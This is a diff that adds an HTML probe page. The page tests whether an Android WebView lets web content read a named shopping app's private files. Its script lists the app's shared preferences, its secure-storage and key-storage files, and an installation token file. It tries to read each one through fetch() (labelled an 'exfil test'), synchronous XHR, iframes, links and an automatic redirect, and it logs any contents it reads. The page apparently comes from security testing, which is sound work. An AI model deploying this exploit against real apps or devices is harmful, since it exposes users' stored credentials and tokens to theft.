@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>file access probe v2</title></head>
+<body style="font-family:monospace;font-size:13px;background:#fff">
+<h3>WebView file:// access probe v2</h3>
+<pre id="log"></pre>
+<script>
+var files = [
+ 'file:///data/user/0/com.aswat.carrefouruae/shared_prefs/FlutterSharedPreferences.xml',
+ 'file:///data/user/0/com.aswat.carrefouruae/shared_prefs/FlutterSecureStorage.xml',
+ 'file:///data/user/0/com.aswat.carrefouruae/shared_prefs/FlutterSecureKeyStorage.xml',
+ 'file:///data/user/0/com.aswat.carrefouruae/shared_prefs/constructor_pref_file.xml',
+ 'file:///data/user/0/com.aswat.carrefouruae/files/PersistedInstallation.W0RFRkFVTFRd+MTo1ODkxNjc0NjQ1Nzg6YW5kcm9pZDo4NzRhYjRmOThlZTk1NzYy.json',
+ 'file:///sdcard/Download/test.txt'
+];
+function L(s){ var p=document.getElementById('log'); p.textContent+=new Date().toISOString().slice(11,19)+'  '+s+'\n'; }
+function tag(t){ if(document.title.indexOf(t)<0) document.title+=' '+t; }
+L('== 1. fetch() each file (exfil test) ==');
+files.forEach(function(f){
+  fetch(f).then(function(r){return r.text();}).then(function(t){ L('FETCH-OK '+f+' :: '+t.slice(0,200)); tag('FETCH-OK'); })
+  .catch(function(e){ L('fetch Fail '+f+' :: '+e.message); });
+});
+L('== 2. XHR each file ==');
+files.forEach(function(f){
+  try{ var x=new XMLHttpRequest(); x.open('GET',f,false); x.send();
+       L(x.status===0?'XHR(err?) status='+x.status:('XHR-OK '+f+' len='+(x.responseText||'').length)); tag('XHR-OK'); }
+  catch(e){ L('xhr Fail '+f+' :: '+e.message); }
+});
+L('== 3. iframes ==');
+files.forEach(function(f){ var i=document.createElement('iframe'); i.src=f; i.style.cssText='width:280px;height:60px;border:1px solid red'; document.body.appendChild(i); });
+L('== 4. LINKS (tap to navigate) ==');
+var u=document.createElement('ul');
+files.forEach(function(f){ var l=document.createElement('li'); var a=document.createElement('a'); a.href=f; a.textContent=f; a.style.color='blue'; l.appendChild(a); u.appendChild(l); });
+document.body.appendChild(u);
+L('== control: this https link below MUST navigate (proves link navigation works) ==');
+var c=document.createElement('a'); c.href='https://example.com'; c.textContent='https://example.com (control)'; c.style.color='green'; document.body.appendChild(c);
+document.body.appendChild(document.createElement('br'));
+L('== 5. auto-nav to first file in 3s ==');
+setTimeout(function(){ L('AUTO-NAV to '+files[0]); tag('NAV'); window.location.href=files[0]; },3000);
+</script>
+</body>
+</html>
